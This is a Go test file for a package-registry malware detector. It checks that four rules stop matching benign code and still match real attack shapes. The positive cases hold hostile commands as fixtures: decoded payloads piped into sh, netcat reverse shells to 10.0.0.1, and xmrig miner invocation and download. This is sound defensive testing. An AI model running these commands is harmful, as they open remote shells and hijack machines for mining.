package detect

import (
	"slices"
	"testing"
)

// Pass 12 (2026-10-25), from a read of every still-malicious cargo, hex, nuget, rubygems and pubdev
// mint after the v0.7.18 rescan. Four rules matched text their patterns were never written for:
//
//	P-BASE32, P-XXD-DECODE  `\s` and `(\S+\s+)*` crossed newlines, so "base32" in one line of prose
//	                        or code and a "-d" anywhere later joined into a "decode" (codec crates,
//	                        TypeID, iroh node ids, ULID alphabets)
//	P-REVSHELL-NC           no command position: `let nc = -c * inv;` in an affine transform
//	P-MINER-BINARY          no word boundary: gminer inside sigminer, cgminer_version, logminer
//
// The check here is the rule, not the mint verdict: each line must not produce the rule's id, and
// each genuine shape must still produce it.
func ruleFires(id, eco, src string) bool {
	return slices.Contains(ids(Detect(&PackageContext{Name: "pkg", Ecosystem: eco, PkgbuildContent: src, PkgbuildExecutes: true})), id)
}

func TestRuleBoundariesStopTextMatches(t *testing.T) {
	for _, tc := range []struct{ id, eco, src string }{
		{"P-BASE32", "cargo", "//! Crockford base32 ids.\npub fn parse(s: &str) -> Result<Id, Error> { decode(s, -d) }"},
		{"P-BASE32", "rubygems", "ALPHABET = '0123456789ABCDEFGHJKMNPQRSTVWXYZ' # base32\nopts = %w[-d]"},
		{"P-XXD-DECODE", "cargo", "/// output matches xxd\nlet args = [\"-r\"];"},
		{"P-REVSHELL-NC", "cargo", "        let nc = -c * inv;"},
		{"P-MINER-BINARY", "cran", ".Call(`_sigminer_cosineVector`, x, y)"},
		{"P-MINER-BINARY", "cargo", "let v = cgminer_version();"},
		{"P-MINER-BINARY", "pypi", "from logminer import parse"},
	} {
		if ruleFires(tc.id, tc.eco, tc.src) {
			t.Errorf("%s fired on %s text: %q", tc.id, tc.eco, tc.src)
		}
	}
}

func TestRuleBoundariesKeepRealShapes(t *testing.T) {
	for _, tc := range []struct{ id, src string }{
		{"P-BASE32", "echo MZXW6YTBOI====== | base32 -d | sh"},
		{"P-BASE32", "base32 --decode payload.txt > /tmp/x"},
		{"P-XXD-DECODE", "echo 7368 | xxd -r -p | bash"},
		{"P-XXD-DECODE", "xxd -p -r blob.hex > /tmp/a"},
		{"P-REVSHELL-NC", "nc -e /bin/sh 10.0.0.1 4444"},
		{"P-REVSHELL-NC", "nc 10.0.0.1 4444 -e /bin/bash"},
		{"P-REVSHELL-NC", "ncat 10.0.0.1 4444 -c bash &"},
		{"P-MINER-BINARY", "./xmrig -o pool:3333 -u wallet"},
		{"P-MINER-BINARY", "curl -o /tmp/xmrig.tar.gz https://x/xmrig-6.21.tar.gz"},
	} {
		if !ruleFires(tc.id, "npm", tc.src) {
			t.Errorf("%s no longer fires on %q", tc.id, tc.src)
		}
	}
}
